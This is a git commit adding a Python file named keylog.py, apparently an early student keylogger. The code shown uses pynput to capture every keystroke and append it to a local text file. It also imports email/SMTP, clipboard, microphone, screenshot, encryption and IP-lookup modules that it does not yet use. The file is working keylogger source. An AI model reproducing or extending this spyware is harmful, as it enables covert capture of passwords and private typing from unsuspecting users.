1ff4ed859b067fe0c0a061cd289e5911a7797d0c
aditigupta72003 <aditigupta72003@gmail.com>
2024-03-17 14:25:18 +0530

    first commit

---
+++ project/keylog.py
@@ -0,0 +1,69 @@
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
+from pynput.keyboard import Key, Listener
+import time
+import os
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+from multiprocessing import process, freeze_support
+from PIL import ImageGrab
+
+
+file_path = "C:\\Users\\hp\\PycharmProjects\\keylogger_css\\project"
+extend = "\\"
+count = 0
+keys = []
+def on_press(key):
+    global keys, count
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys=[]
+
+def write_file(keys):
+    with open(file_path + extend + "keys_information.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("keys") == -1:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
